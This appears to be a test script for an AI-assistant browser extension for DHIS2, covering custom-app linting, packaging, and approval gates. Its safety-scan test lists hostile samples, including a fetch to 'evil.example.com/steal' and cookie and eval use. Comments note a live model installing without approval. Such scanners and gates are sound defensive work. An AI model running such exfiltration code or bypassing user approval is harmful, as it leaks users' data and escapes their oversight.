  chrome.tabs.query = () => Promise.resolve([{ id: 1, windowId: 1 }]); // the focused tab is #1
  const STAGE = 'T7P34dKkJvS';
  d.pageContext = { appType: 'Capture', programId: 'OkA1bPReqR1' };
  d.programMetadata = { id: 'OkA1bPReqR1', programStages: [{ id: STAGE }] };
  await call({ type: 'DHIS2_STAGE_DETECTED', payload: { stageId: STAGE } }, { ...page, tab: { id: 2, windowId: 1 } });
  truthy('stage detected in a BACKGROUND tab is ignored', d.pageContext.stageId === undefined);
  await call({ type: 'DHIS2_STAGE_DETECTED', payload: { stageId: STAGE } }, { ...page, tab: { id: 1, windowId: 1 } });
  truthy('stage detected in the focused tab is applied', d.pageContext.stageId === STAGE);
  truthy('a content script cannot report another origin', (await call({ type: 'DHIS2_CONTEXT_UPDATE', payload: { url: 'https://other.example/apps/capture' } }, { ...page, tab: { id: 1 } })).ignored === true);

  // initializeFromUrl: one run per URL, serialized, latest navigation wins.
  const realNow = ctx.initializeFromUrlNow;
  let runs = [], active = 0, maxActive = 0;
  ctx.initializeFromUrlNow = async (url) => {
    runs.push(url); active++; maxActive = Math.max(maxActive, active);
    await Promise.resolve(); await Promise.resolve();
    active--;
    return { success: true, url };
  };
  const A = 'http://localhost:8081/apps/capture#/?programId=a3kGcGpz8FJ', B = 'http://localhost:8081/apps/capture#/?programId=b3kGcGpz8FJ';
  const same = await Promise.all([ctx.initializeFromUrl(A), ctx.initializeFromUrl(A), ctx.initializeFromUrl(A)]);
  truthy('3 concurrent calls for one URL → ONE context load', runs.length === 1 && same.every((r) => r.url === A));
  runs = [];
  const [ra, rb] = await Promise.all([ctx.initializeFromUrl(A), ctx.initializeFromUrl(B)]);
  truthy('A then B at once → only B loads; A\'s caller gets B\'s result', runs.length === 1 && runs[0] === B && ra.url === B && rb.url === B);
  truthy('context loads never overlap', maxActive === 1);
  ctx.initializeFromUrlNow = realNow;
  delete chrome.runtime.sendMessage;
  chrome.tabs.query = () => Promise.resolve([]);
  await flush();
  hardeningChecksDone = true;
})().catch((e) => { hardeningChecksDone = true; bad(`hardening checks threw: ${e && e.stack || e}`); });

// ── manage_custom_app (src/tools-apps.js) ───────────────────────────────────
// Runs from the verdict's setImmediate, AFTER every other async block has
// drained, because it swaps the shared fetch / safeDhis2Fetch stubs. Still
// microtask-only: the kit is served from disk through a resolved-promise fetch
// stub, Sucrase and fflate are synchronous.
async function runCustomAppChecks() {
  console.log('\nCustom apps & plugins (manage_custom_app):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(`${label} => ${JSON.stringify(got)}`) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
  const d = ctx.__dhis2();
  const saved = { baseUrl: d.baseUrl, apiVersion: d.apiVersion, writeAuth: d.writeAuth, fetch: ctx.fetch, sdf: ctx.safeDhis2Fetch };
  d.baseUrl = 'http://localhost:8081'; d.apiVersion = 42;

  // Keys: slugified from the name, always ai-, [a-z0-9-], ≤ 40 chars.
  eq('slug("ANC coverage widget")', ctx.slugifyCustomAppKey('ANC coverage widget'), 'ai-anc-coverage-widget');
  eq('slug("AI Demo") keeps a single ai- prefix', ctx.slugifyCustomAppKey('AI Demo'), 'ai-demo');
  truthy('slug of an Arabic-only name is a stable ai-app-<hash>', /^ai-app-[a-z0-9]+$/.test(ctx.slugifyCustomAppKey('ملخص الوحدات')) && ctx.slugifyCustomAppKey('ملخص الوحدات') === ctx.slugifyCustomAppKey('ملخص الوحدات'));
  truthy('slug of a very long name is ≤ 40 chars and has no trailing hyphen', (() => { const k = ctx.slugifyCustomAppKey('A very long name for a dashboard widget that shows many things'); return k.length <= 40 && !k.endsWith('-'); })());
  truthy('explicit key without ai- prefix is refused', !!ctx.resolveCustomAppKey({ key: 'demo' })._error);
  truthy('explicit key with upper case / underscore is refused', !!ctx.resolveCustomAppKey({ key: 'ai-Bad_Key' })._error);
  eq('valid explicit key is kept', ctx.resolveCustomAppKey({ key: 'ai-kpi-2' }).key, 'ai-kpi-2');
  eq('version bump patch / minor', [ctx.bumpCustomAppVersion('1.0.0'), ctx.bumpCustomAppVersion('1.2.3', 'minor')], ['1.0.1', '1.3.0']);
  const bk = ctx.customAppBackupKey('ai-kpi-2');
  eq('backup key round-trips the app key (hyphenated keys)', ctx.parseCustomAppBackupKey(bk) && ctx.parseCustomAppBackupKey(bk).appKey, 'ai-kpi-2');
  eq('a metadata backup key is not an app backup', ctx.parseCustomAppBackupKey('backup-20260708T111347Z-update-uY6mWX'), null);

  // Compile: Sucrase errors carry line / column + a code frame.
  const brokenJsx = 'const A = () => (\n  <div>\n    <span>x</div>\n);';
  const ce = ctx.compileCustomAppFile('app.jsx', brokenJsx);
  truthy('JSX syntax error → line/column + frame', ce.error && ce.error.line === 3 && ce.error.column > 0 && /3 \|/.test(ce.error.frame));
  const crossed = ctx.compileCustomAppFile('app.jsx', 'const A = () => <h1 className="t">Title</h2>;');
  truthy('crossed tags (<h1>…</h2>) are an error — Sucrase alone would compile them silently', crossed.error && /<\/h2> found where <\/h1> was expected/.test(crossed.error.message));
  const missingParen = ctx.compileCustomAppFile('app.jsx', 'const A = () => (\n  <div>\n    {a.map(x => <b>{x}</b>}\n  </div>\n);');
  truthy('a missing ")" before "}" is reported on its own line (not where Sucrase backtracked)', missingParen.error && missingParen.error.line === 3 && /"\)" was expected/.test(missingParen.error.message));
  truthy('valid JSX compiles to React.createElement', /React\.createElement\(/.test(ctx.compileCustomAppFile('app.jsx', 'const A = () => <b>x</b>;').code || ''));

  // Safety scan.
  const scan = (src, opts) => ctx.scanCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, { allowedOrigin: 'http://localhost:8081', ...(opts || {}) });
  const banned = {
    eval: 'eval("1+1");',
    'new-function': 'const f = new Function("return 1");',
    cookie: 'const c = document.cookie;',
    'browser-storage': 'localStorage.setItem("a", "b");',
    'script-tag': 'const s = "<script src=x></script>";',
    'external-request': 'fetch("https://evil.example.com/steal");',
    import: 'import x from "y";',
    require: 'const x = require("y");',
    'html-injection': 'const A = () => <div dangerouslySetInnerHTML={{ __html: "x" }} />;',
    socket: 'new WebSocket("wss://x");',
  };
  for (const [rule, src] of Object.entries(banned)) {
    truthy(`safety scan catches ${rule}`, scan(src).some((v) => v.rule === rule));
  }
  truthy('UI text that merely mentions localStorage / eval() is not flagged', scan('const A = () => <p>Nothing is kept in localStorage or passed to eval()</p>;').length === 0);
  truthy('same-origin absolute fetch is allowed', scan('fetch("http://localhost:8081/api/42/me");').length === 0);
  const writeSrc = 'const { useDataMutation } = D2Runtime;\nconst M = { resource: "dataStore/ai-x/k", type: "create", data: {} };\nfunction A() { const [m] = useDataMutation(M); return null; }';
  truthy('mutation refused when needs_write_access is false', scan(writeSrc).some((v) => v.rule.startsWith('write:')));
  eq('mutation allowed when needs_write_access is true', scan(writeSrc, { needsWriteAccess: true }).length, 0);
  truthy('fetch with method POST refused when read-only', scan('fetch("/api/42/dataStore/x/y", { method: "POST" });').some((v) => v.rule === 'write:http-write'));

  // Lint: the runtime errors a blank page would otherwise hide.
  const kitMeta = JSON.parse(fs.readFileSync(path.join(ROOT, 'libs/d2-kit/KIT_VERSION.json'), 'utf8'));
  const lint = (src, kind = 'app') => ctx.lintCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, kind, kitMeta);
  const root = "\nReactDOMClient.createRoot(document.getElementById('root')).render(<A />);";
  truthy('undeclared <Card> is an error naming the D2UI fix', lint('const A = () => <Card>x</Card>;' + root).errors.some((e) => /Card/.test(e.message) && /D2UI/.test(e.message)));
  truthy('a name D2UI does not export is an error', lint('const { Grid } = D2UI;\nconst A = () => <Grid />;' + root).errors.some((e) => /no export "Grid"/.test(e.message)));
  truthy('bare useState() without destructuring is an error', lint('const A = () => { const [a] = useState(0); return a; };' + root).errors.some((e) => /useState/.test(e.message)));
  truthy('inline useDataQuery({…}) is an error (static-input trap)', lint('const { useDataQuery, DataProvider } = D2Runtime;\nconst A = () => { useDataQuery({ a: { resource: "me" } }); return null; };' + root).errors.some((e) => /inline object/.test(e.message)));
  truthy('HeaderBar is refused (Global Shell draws it)', lint('const { HeaderBar } = D2UI;\nconst A = () => <HeaderBar />;' + root).errors.some((e) => /HeaderBar/.test(e.message)));
  {
    // dataStore key reads: a 404 until the key exists (live 2026-10-22).
    const ds = (src) => lint(src + root).errors.some((e) => /is read directly, which is a 404/.test(e.message));
    truthy('reading dataStore/<ns>/<key> directly is an error (404 until the first save)', ds("const { useDataEngine, DataProvider } = D2Runtime;\nconst KEY = `dataStore/${D2_APP_CONFIG.namespace}/notes`;\nconst A = () => { const engine = useDataEngine(); engine.query({ n: { resource: KEY } }); return null; };"));
    truthy('…a key path inside a mutation (type: create) is fine', !ds("const { useDataEngine, DataProvider } = D2Runtime;\nconst A = ({ id }) => { const engine = useDataEngine(); engine.mutate({ resource: `dataStore/${D2_APP_CONFIG.namespace}/${id}`, type: 'create', data: { a: 1 } }); return null; };"));
    truthy('…and the filter=_:eq: read keeps the whole app clean', !ds("const { useDataEngine, DataProvider } = D2Runtime;\nconst S = { s: { resource: `dataStore/${D2_APP_CONFIG.namespace}`, params: { fields: '.', filter: '_:eq:notes' } } };\nconst KEY = `dataStore/${D2_APP_CONFIG.namespace}/notes`;\nconst A = () => null;"));
  }
  {
    // An always-open Modal blocks the whole app (live 2026-10-22).
    const modal = (body) => lint("const { Modal, ModalTitle } = D2UI;\nconst A = ({ t, open }) => " + body + ";" + root).errors.some((e) => /rendered unconditionally/.test(e.message));
    truthy('an unconditional <Modal> child is an error (its backdrop blocks every click)', modal('<div><p>x</p><Modal><ModalTitle>Delete</ModalTitle></Modal></div>'));
    truthy('…{t && <Modal>}, a ternary, hide={!open} and a component returning a Modal are fine',
      !modal('<div>{t && <Modal><ModalTitle>D</ModalTitle></Modal>}</div>') && !modal('<div>{t ? <Modal><ModalTitle>D</ModalTitle></Modal> : null}</div>')
      && !modal('<div><Modal hide={!open}><ModalTitle>D</ModalTitle></Modal></div>') && !modal('<Modal><ModalTitle>D</ModalTitle></Modal>'));
  }
  {
    // Mutation shapes app-runtime refuses at runtime (live 2026-10-22).
    const mu = (body) => lint("const { useDataEngine, DataProvider } = D2Runtime;\nconst A = ({ rest, last, k }) => { const engine = useDataEngine(); " + body + " return null; };" + root).errors.map((e) => e.message).join(' | ');
    truthy("{ type: last ? 'delete' : 'update', data } is an error (Invalid query at runtime)", /does not support property 'data'/.test(mu("engine.mutate({ resource: `dataStore/x/${k}`, type: last ? 'delete' : 'update', data: rest });")));
    truthy("{ type: 'create', id } is an error", /does not support property 'id'/.test(mu("engine.mutate({ resource: 'dataStore/x', type: 'create', id: k, data: rest });")));
    truthy("{ type: 'delete' } without data and { type: 'update', data } are fine", !/does not support/.test(mu("engine.mutate({ resource: `dataStore/x/${k}`, type: 'delete' }); engine.mutate({ resource: `dataStore/x/${k}`, type: 'update', data: rest });")));
    truthy("a non-mutation object with type 'delete' (no resource) is not flagged", !/does not support/.test(mu("const action = { type: 'delete', data: rest };")));
  }
  {
    // dhis2_query: ;-joined metadata filters are a 400 (live 2026-10-22).
    const h = ctx.healJoinedMetadataFilters;
    const split = new URLSearchParams(h('programs?fields=id&filter=programType:eq:WITH_REGISTRATION;displayName:ilike:mch').split('?')[1]).getAll('filter');
    truthy('joined metadata filters are split into one filter parameter each', JSON.stringify(split) === JSON.stringify(['programType:eq:WITH_REGISTRATION', 'displayName:ilike:mch']));
    truthy('…analytics ou:A;B filters stay joined', h('analytics?dimension=pe:THIS_YEAR&filter=ou:USER_ORGUNIT;USER_ORGUNIT_CHILDREN') === 'analytics?dimension=pe:THIS_YEAR&filter=ou:USER_ORGUNIT;USER_ORGUNIT_CHILDREN');
    truthy('…a single filter or a value with ; that is not an expression is untouched', h('programs?filter=displayName:eq:a') === 'programs?filter=displayName:eq:a' && h('dataElements?filter=name:like:a;b') === 'dataElements?filter=name:like:a;b');
  }
  truthy('a plugin without the getPropsFromParent handshake is an error', ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', 'const A = () => null;' + root).code }, 'plugin', kitMeta).errors.some((e) => /getPropsFromParent/.test(e.message)));
  {
    // Capture enrollment plugins (props verified against the plugins installed on 2.42 / Capture 106).
    const capLint = (src) => ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', src + root).code }, 'plugin', kitMeta, 'CAPTURE').warnings.map((w) => w.message).join(' | ');
    const shake = "\npostRobot.send(window.parent, 'getPropsFromParent');";
    truthy('CAPTURE: missing setPluginHeight warns that Capture sizes the widget to the reported height', /Capture sizes the widget/.test(capLint('const A = ({ enrollmentId }) => enrollmentId;' + shake)));
    truthy('CAPTURE: a plugin that reads neither enrollmentId/teiId nor values/setFieldValue is warned', /neither enrollmentId \/ teiId/.test(capLint('const A = ({ enrollment }) => enrollment;' + shake)));
    truthy('CAPTURE: reading enrollmentId clears that warning', !/neither enrollmentId/.test(capLint('const A = ({ enrollmentId, setPluginHeight }) => enrollmentId;' + shake)));
    truthy('CAPTURE: a form-field plugin (values / setFieldValue) is not told to read enrollmentId', !/neither enrollmentId/.test(capLint("const A = ({ values, setFieldValue }) => { setFieldValue({ fieldId: 'x', value: values.y }); return null; };" + shake)));
    truthy('CAPTURE: reporting a wrapper offsetHeight (not #root) is warned', /Report the height of #root/.test(capLint('const A = ({ enrollmentId, setPluginHeight }) => { const ref = React.useRef(null); setPluginHeight(ref.current.offsetHeight); return enrollmentId; };' + shake)));
    truthy('DASHBOARD wording unchanged for dashboard plugins', /dashboard item keeps its default height/.test(ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', 'const A = () => null;' + shake + root).code }, 'plugin', kitMeta, 'DASHBOARD').warnings.map((w) => w.message).join(' ')));
    const where = ctx.customAppWhereToFind({ name: 'Meds', key: 'ai-meds', plugin_launch_url: 'http://x/api/apps/ai-meds/plugin.html' }, 'plugin', 'CAPTURE').join(' ');
    truthy('CAPTURE where_to_find says it is not placed yet and how to place it (place action / Configurator)', /Not placed yet/.test(where) && /action="place"/.test(where) && /Tracker Plugin Configurator/.test(where));
    truthy('the manual documents the verified Capture props', /teiId, programId, enrollmentId, orgUnitId/.test(ctx.MANUAL_EXTRAS.manage_custom_app || ''));
    const agentSrc = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
    truthy('a cut-off manage_custom_app call gets code-shrinking advice, not program-splitting advice', /toolName === 'manage_custom_app'\s*\n[^\n]*\n\s*\? `Write SHORTER source/.test(agentSrc));
  }
  const clean = "const { useState } = React;\nconst { DataProvider, useDataQuery } = D2Runtime;\nconst { Card, CircularLoader } = D2UI;\nconst Q = { me: { resource: 'me' } };\nfunction Box({ icon: Icon }) { return <Icon />; }\nfunction A() { const [n] = useState(0); const { loading } = useDataQuery(Q); return loading ? <CircularLoader /> : <Card>{n}</Card>; }\nReactDOMClient.createRoot(document.getElementById('root')).render(<DataProvider baseUrl={D2_APP_CONFIG.baseUrl} apiVersion={D2_APP_CONFIG.apiVersion}><A /></DataProvider>);";
  eq('a clean read-only app lints with no errors', lint(clean).errors, []);
  // DHIS2 app-development skill conventions → advisory warnings.
  const warns = (src) => lint(src + root).warnings.map((w) => w.message).join(' | ');
  truthy('warning: metadata query without fields', /without a fields parameter/.test(warns("const Q = { p: { resource: 'programs', params: { paging: false } } };\nconst A = () => null;")));
  truthy('warning: fields with name instead of displayName', /displayName/.test(warns("const Q = { p: { resource: 'programs', params: { fields: 'id,name' } } };\nconst A = () => null;")));
  truthy('warning: delete without a confirmation Modal', /confirmation/.test(warns("const M = { resource: 'dataStore/x/y', type: 'delete' };\nconst A = () => null;")));
  eq('no warnings for fields id,displayName', warns("const Q = { p: { resource: 'programs', params: { fields: 'id,displayName' } } };\nconst A = () => null;"), '');
  eq('a clean read-only app passes the safety scan', scan(clean).length, 0);
  const uids = ctx.extractCustomAppUids({ 'app.jsx': 'const a = "fbfJHSPpUQD"; const b = "dataElement"; const c = "ProgramName"; const d = "dx:IpHINAT79UW;Eoof9sGAqcT";' });
  eq('UID extraction: real-looking ids only, not camelCase words', uids.sort(), ['Eoof9sGAqcT', 'IpHINAT79UW', 'fbfJHSPpUQD']);

  // Stubbed transport: the kit comes from disk; /api/apps answers from APPS.
  let APPS = [];
  let calls = [];
  ctx.fetch = (url) => {
    const u = String(url);
    calls.push(u);
    if (u.startsWith('chrome-extension://verify/')) {
      const abs = path.join(ROOT, u.slice('chrome-extension://verify/'.length));
      const buf = fs.existsSync(abs) ? fs.readFileSync(abs) : null;
      return Promise.resolve({ ok: !!buf, status: buf ? 200 : 404, text: async () => buf.toString('utf8'), arrayBuffer: async () => buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.length) });
    }
    return Promise.reject(new Error('network disabled in verify: ' + u));
  };
  ctx.safeDhis2Fetch = async (p, o) => {
    calls.push(`${(o && o.method) || 'GET'} ${p}`);
    if (p === 'apps') return APPS;
    if (/^metadata\?fields=id&filter=id:in:/.test(p)) return { programs: [{ id: 'fbfJHSPpUQD' }] };
    if (p === 'system/info?fields=version') return { version: '2.42.5.1' };
    return { _error: 'unexpected call in verify: ' + p };
  };

  // Packaging per kind: expected files, manifest fields, echarts only when used.
  const unzip = (z) => ctx.fflate.unzipSync(z);
  const td = new TextDecoder();
  const mkSpec = (kind, sources, extra) => Object.assign(ctx.customAppSpecFromArgs({ name: 'Verify app', kind, plugin_type: kind === 'app' ? undefined : 'DASHBOARD' }, 'ai-verify-app', null), { sources }, extra || {});
  const appSrc = clean;
  const pluginSrc = "const { DataProvider } = D2Runtime;\nconst P = () => <div>p</div>;\nconst root = ReactDOMClient.createRoot(document.getElementById('root'));\npostRobot.send(window.parent, 'getPropsFromParent').then(({ data }) => root.render(<DataProvider baseUrl={D2_APP_CONFIG.baseUrl} apiVersion={D2_APP_CONFIG.apiVersion}><P {...data} /></DataProvider>));";
  const kinds = {
    app: { 'app.jsx': appSrc },
    plugin: { 'plugin.jsx': pluginSrc },
    app_and_plugin: { 'app.jsx': appSrc, 'plugin.jsx': pluginSrc, 'shared.jsx': 'const SHARED = 1;' },
  };
  for (const [kind, sources] of Object.entries(kinds)) {
    const prep = await ctx.prepareCustomAppBuild(mkSpec(kind, { ...sources }));
    if (prep._error) { bad(`package ${kind}: ${prep._error} ${JSON.stringify(prep.problems || prep.violations || '')}`); continue; }
    const files = unzip(prep.pkg.zip);
    const m = JSON.parse(td.decode(files['manifest.webapp']));
    const ai = JSON.parse(td.decode(files['src/manifest.ai.json']));
    const need = ['manifest.webapp', 'app-config.js', 'd2-kit.min.js', 'd2-kit.css', 'fonts/roboto-latin-400-normal.woff2', 'src/manifest.ai.json']
      .concat(kind !== 'plugin' ? ['index.html', 'app.js', 'src/app.jsx'] : [])
      .concat(kind !== 'app' ? ['plugin.html', 'plugin.js', 'src/plugin.jsx'] : [])
      .concat(kind === 'app_and_plugin' ? ['shared.js', 'src/shared.jsx'] : []);
    const missing = need.filter((f) => !files[f]);
    truthy(`${kind}: zip has ${need.length} expected files`, missing.length === 0 || missing);
    truthy(`${kind}: manifest short_name/developer/namespace`, m.short_name === 'ai-verify-app' && m.developer && m.developer.company === 'dhis2-ai-assistant' && m.activities.dhis.namespace === 'ai-verify-app');
    truthy(`${kind}: launch_path ${kind === 'plugin' ? 'omitted' : 'set'}, plugin fields ${kind === 'app' ? 'omitted' : 'set'}`,
      (kind === 'plugin' ? !m.launch_path : m.launch_path === 'index.html') && (kind === 'app' ? !m.plugin_launch_path && !m.plugin_type : m.plugin_launch_path === 'plugin.html' && m.plugin_type === 'DASHBOARD'));
    truthy(`${kind}: AI manifest marker + file list`, ai.created_by === 'dhis2-ai-assistant' && ai.key === 'ai-verify-app' && ai.files.length === Object.keys(sources).length && ai.kit_version === kitMeta.kit_version);
    truthy(`${kind}: no echarts.min.js when the code does not use it`, !files['echarts.min.js']);
    truthy(`${kind}: D2_APP_CONFIG carries serverVersion {major:2,minor:42} and apiVersion 42`, /"serverVersion":\{"major":2,"minor":42,"patch":5,"full":"2\.42\.5\.1"\}/.test(td.decode(files['app-config.js'])) && /"apiVersion":42/.test(td.decode(files['app-config.js'])));
    if (kind === 'app_and_plugin') {
      const html = td.decode(files['plugin.html']);
      truthy('plugin.html loads kit → config → shared → plugin in order, body.d2-plugin, dir=auto',
        /d2-kit\.min\.js[\s\S]*app-config\.js[\s\S]*shared\.js[\s\S]*plugin\.js/.test(html) && /<body class="d2-plugin">/.test(html) && /<html dir="auto">/.test(html));
      const capHtml = ctx.buildCustomAppHtml({ name: 'x', pluginType: 'CAPTURE', usesEcharts: false, sources: { 'plugin.jsx': '' } }, 'plugin.js');
      truthy('a CAPTURE plugin page is auto-height (no body.d2-plugin) and links capture-plugin.css (#root flow-root)', /<body class="d2-capture-plugin">/.test(capHtml) && !/d2-plugin"/.test(capHtml) && /href="capture-plugin\.css"/.test(capHtml) && /flow-root/.test(ctx.CAPTURE_PLUGIN_CSS || vm.runInContext('CAPTURE_PLUGIN_CSS', ctx)));
    }
  }
  const chartSrc = appSrc.replace('function A() {', 'function C() { const el = React.useRef(null); React.useEffect(() => { echarts.init(el.current); }, []); return <div ref={el} />; }\nfunction A() {');
  const pc = await ctx.prepareCustomAppBuild(mkSpec('app', { 'app.jsx': chartSrc }));
  truthy('echarts.min.js is bundled (and loaded before app.js) when the code uses echarts',
    !pc._error && unzip(pc.pkg.zip)['echarts.min.js'] && /echarts\.min\.js[\s\S]*app\.js/.test(td.decode(unzip(pc.pkg.zip)['index.html'])));
  const unk = await ctx.prepareCustomAppBuild(mkSpec('app', { 'app.jsx': clean.replace("resource: 'me'", "resource: 'programs/AbCdEfGh123'") }));
  truthy('a hard-coded UID that does not exist on the server is refused', unk.unknown_uids && unk.unknown_uids[0] === 'AbCdEfGh123');

  // Never touch apps the assistant did not build.
  calls = [];
  const notAi = await ctx.executeManageCustomApp({ action: 'delete', key: 'dashboard' });
  truthy('delete "dashboard" (no ai- prefix) refused before any request', notAi._refused_not_managed && calls.length === 0);
  APPS = [{ key: 'ai-demo', name: 'AI Demo', version: '1.0.0', folderName: 'apps/ai-demo' }];
  d.writeAuth = { scope: 'broad', reason: 'verify' };
  const noMarker = await ctx.executeManageCustomApp({ action: 'update', key: 'ai-demo', files: { 'app.jsx': appSrc } });
  truthy('update of an ai- app WITHOUT the assistant marker is refused', noMarker._refused_not_managed);
  truthy('…without fetching its files (no probe that would 404)', !calls.some((c) => /\/api\/apps\/ai-demo\//.test(c)));
  truthy('delete of an ai- app without the marker is refused', (await ctx.executeManageCustomApp({ action: 'delete', key: 'ai-demo' }))._refused_not_managed);
  truthy('rollback of an ai- app without the marker is refused', (await ctx.executeManageCustomApp({ action: 'rollback', key: 'ai-demo' }))._refused_not_managed);

  // Conflicts are caught client-side (no 409 round trip).
  APPS = [{ key: 'ai-other', folderName: 'apps/ai-verify-app', activities: { dhis: { namespace: 'ai-verify-app' } } }];
  const conf = ctx.customAppConflicts(mkSpec('app', {}), APPS, 'create').map((c) => c.code).sort();
  eq('namespace + upload-folder collisions detected before upload', conf, ['folder_in_use', 'namespace_in_use']);

  // requireWriteAuth gates every write action.
  APPS = [{ key: 'ai-verify-app', name: 'Verify app', version: '1.0.0', folderName: 'apps/ai-verify-app', developer: { company: 'dhis2-ai-assistant' } }];
  d.writeAuth = { scope: 'read_only', reason: 'verify: no authorization' };
  const gated = (r) => r && r._scope === 'requires_user_confirmation' && /manage_custom_app/.test(r._error);
  truthy('create is refused on a read-only turn', gated(await ctx.executeManageCustomApp({ action: 'create', key: 'ai-verify-new', name: 'New', files: { 'app.jsx': appSrc } })));
  truthy('delete is refused on a read-only turn', gated(await ctx.executeManageCustomApp({ action: 'delete', key: 'ai-verify-app' })));
  const aiManifest = { key: 'ai-verify-app', name: 'Verify app', kind: 'app', version: '1.0.0', created_by: 'dhis2-ai-assistant', files: ['app.jsx'] };
  ctx.fetch = ((inner) => (url, o) => {
    const u = String(url);
    if (u.endsWith('/api/apps/ai-verify-app/src/manifest.ai.json')) return Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => JSON.stringify(aiManifest) });
    if (u.endsWith('/api/apps/ai-verify-app/src/app.jsx')) return Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => appSrc });
    return inner(url, o);
  })(ctx.fetch);
  truthy('update is refused on a read-only turn', gated(await ctx.executeManageCustomApp({ action: 'update', key: 'ai-verify-app', files: { 'app.jsx': appSrc } })));
  const pv = await ctx.executeManageCustomApp({ action: 'preview', name: 'Verify app 2', files: { 'app.jsx': appSrc } });
  truthy('preview runs on a read-only turn (discovery) and returns a token', pv.preview === true && /^pv-[0-9a-f]{16}$/.test(pv.preview_token || ''));
  {
    // Approval = the user's next message, unless they already asked to install
    // (GLM installed right after "Show me a preview first", live 2026-10-22).
    const asked = ctx.userAskedToInstall;
    for (const t of ['Please create and install and enrollment plugin here', 'yes install it', 'build it and deploy it to the server'])
      truthy(`install intent: "${t}"`, asked(t));
    for (const t of ['Build a dashboard widget that shows enrollments. Show me a preview first.', 'make a widget but don\'t install it yet', 'create a KPI plugin', 'preview the app first, then install'])
      truthy(`no install intent: "${t}"`, !asked(t));
    const turn = d.turnCounter || 0;
    vm.runInContext('lastUserText = "Build a dashboard widget. Show me a preview first.";', ctx);
    const same = ctx.customAppApprovalProblem('ai-x', 'pv-0123456789abcdef', turn);
    truthy('create with a preview from THIS turn is refused while the user has not approved', same && same._awaiting_approval === true && /preview_token="pv-0123456789abcdef"/.test(same._hint));
    truthy('…and allowed once the turn has advanced (the user answered)', ctx.customAppApprovalProblem('ai-x', 'pv-0123456789abcdef', turn - 1) === null);
    vm.runInContext('lastUserText = "Please create and install a medication widget";', ctx);
    truthy('…and allowed in the same turn when the user asked to install', ctx.customAppApprovalProblem('ai-x', 'pv-0123456789abcdef', turn) === null);
    vm.runInContext('lastUserText = "";', ctx);
    vm.runInContext('lastUserText = "build me a widget";', ctx);
    truthy('a file create with no earlier preview and no install request is refused', /has not seen a preview/.test((ctx.customAppApprovalProblem('ai-x', null, null) || {})._error || ''));
    truthy('…allowed when the user asked to put it somewhere (placing implies installing)', (vm.runInContext('lastUserText = "create a chart plugin and add it to a new dashboard called Ops";', ctx), ctx.customAppApprovalProblem('ai-x', null, null)) === null);
    truthy('…and allowed after a preview shown in an earlier turn', (vm.runInContext('lastUserText = "ok";', ctx), ctx.customAppApprovalProblem('ai-x', null, turn - 1)) === null);
    vm.runInContext('lastUserText = "";', ctx);
    const pvTurn = await ctx.recallCustomAppPreview(pv.preview_token);
    truthy('the preview remembers the turn it was made in', pvTurn && pvTurn.spec && pvTurn.turn === turn);
  }
  truthy('preview / list / get_source are discovery actions; create is not',
    ctx.isDiscoveryCall('manage_custom_app', { action: 'preview' }) && ctx.isDiscoveryCall('manage_custom_app', { action: 'list' }) && !ctx.isDiscoveryCall('manage_custom_app', { action: 'create' }));

  // Raw dhis2_query can no longer install / uninstall apps.
  d.writeAuth = { scope: 'broad', reason: 'verify' };
  const rawDel = await ctx.executeTool('dhis2_query', { method: 'DELETE', path: 'apps/dashboard' });
  truthy('dhis2_query DELETE apps/<key> is blocked → manage_custom_app', rawDel && rawDel._redirect === 'manage_custom_app');
  // The Capture-layout block is unconditional, so its hint must not invite a
  // "confirm and I'll write it" offer (seen live 2026-10-22 with GLM).
  const capPut = await ctx.executeTool('dhis2_query', { method: 'PUT', path: 'dataStore/capture/enrollmentOverviewLayout', body: {} });
  truthy('dhis2_query PUT dataStore/capture is blocked with an unconditional hint that points to the Tracker Plugin Configurator',
    capPut && /^Blocked/.test(capPut._error || '') && /no user confirmation lifts it/.test(capPut._hint || '') && /manage_custom_app\(action="place"\)/.test(capPut._hint || '') && /Tracker Plugin Configurator/.test(capPut._hint || '') && !/confirm the exact JSON/.test(capPut._hint || ''));

  // A write answered 204 is never re-sent: the empty-body retry turned a
  // completed DELETE /api/apps/<key> into "404 App does not exist".
  let n204 = 0;
  ctx.fetch = () => {
    n204++;
    return Promise.resolve(n204 === 1
      ? { ok: true, status: 204, statusText: 'No Content', type: 'basic', text: async () => '' }
      : { ok: false, status: 404, statusText: 'Not Found', type: 'basic', text: async () => '{"message":"App does not exist: ai-verify-app"}' });
  };
  const del204 = await ctx.__realSafeDhis2Fetch('apps/ai-verify-app', { method: 'DELETE' });
  truthy('a DELETE answered 204 is a success and is NOT re-sent', del204 && del204.success === true && n204 === 1);

  // fetchViaTab: executeScript args must be cloneable — a body-less write
  // (every DELETE) passed `undefined` and Chrome rejected the injection.
  const savedTabs = chrome.tabs.query, savedScripting = chrome.scripting.executeScript;
  let injectedArgs = null;
  chrome.tabs.query = () => Promise.resolve([{ id: 7, url: 'http://localhost:8081/apps/dashboard' }]);
  chrome.scripting.executeScript = (inj) => { injectedArgs = inj.args; return Promise.resolve([{ result: { ok: true, status: 204, statusText: 'No Content', text: '' } }]); };
  const viaTab = await ctx.fetchViaTab('http://localhost:8081/api/42/apps/ai-verify-app', 'DELETE', {}, undefined);
  truthy('fetchViaTab sends null (not undefined) as the body of a body-less write', injectedArgs && injectedArgs.length === 4 && injectedArgs[3] === null && viaTab && viaTab.status === 204);
  chrome.tabs.query = savedTabs;
  chrome.scripting.executeScript = savedScripting;

  // A 409 from a direct DELETE (ObjectReport) keeps its reasons.
